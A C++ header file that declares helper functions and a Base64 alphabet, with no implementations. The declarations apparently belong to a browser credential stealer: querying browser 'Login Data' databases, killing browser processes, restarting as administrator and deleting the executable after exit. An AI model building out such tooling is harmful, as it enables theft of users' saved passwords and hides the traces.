#ifndef HELPER_H
#define HELPER_H

#include "includes\Imports.h"

static const std::string BASE64_CHARS =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

sqlite3_stmt* query_database(std::string target_login_data, const char* database_query);
BOOL custom_copy_file(const std::string& sourceFile, const std::string& destinationFile);
BOOL kill_process(std::string process_path);
std::string GetBrowserProcessName(const std::string& browserFolder);
BOOL CheckProcessPriv();
std::wstring ConvertToWideString(const char* str);
std::wstring StringToWString(const std::string& str);
void RestartAsAdmin(const char* param);
std::vector<uint8_t> Base64Decode(const std::string& encoded_string);
std::string Base64Encode(const std::vector<uint8_t>& data);
inline bool isBase64(unsigned char c);
std::wstring GetExecutablePath();
bool file_exist(const std::string& filePath);
std::string BytesToHexString(const BYTE* byteArray, size_t size);
std::string ReadUTF16LEFileToUTF8(const std::string& filename);
std::string GetAppDataPath();
void DeleteFileAfterExit(const std::string& exePath);
bool waitForFile(const std::string& filePath, int maxWaitTimeMs, int pollIntervalMs);
//bool writeToFileWithLock(const std::string& data, const std::string& path, int timeout_ms);

#endif /* HELPER_H */#pragma once
